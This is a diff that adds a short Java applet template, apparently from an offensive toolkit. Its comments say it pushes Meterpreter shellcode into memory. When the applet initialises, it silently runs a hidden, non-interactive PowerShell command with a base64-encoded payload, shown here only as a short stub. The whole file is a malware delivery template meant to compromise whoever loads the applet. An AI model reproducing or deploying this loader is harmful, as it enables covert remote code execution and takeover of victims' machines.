@@ -1,0 +1,26 @@
+// java applet template | Author: r00t-3xp10it
+// execute base64 powershell shellcode using java applets 
+// ---
+
+
+import java.applet.*;
+import java.awt.*;
+import java.io.*;
+
+public class Java extends Applet {
+public void init() {
+Process f;
+
+// Push Meterpreter (shellcode) into memory
+String cmd = "cmd.exe /c powershell -nop -win Hidden -noni -enc InJ3C";
+try {
+f = Runtime.getRuntime().exec(cmd);
+}
+
+catch(IOException e) {
+e.printStackTrace();
+}
+Process s;
+}
+}
+
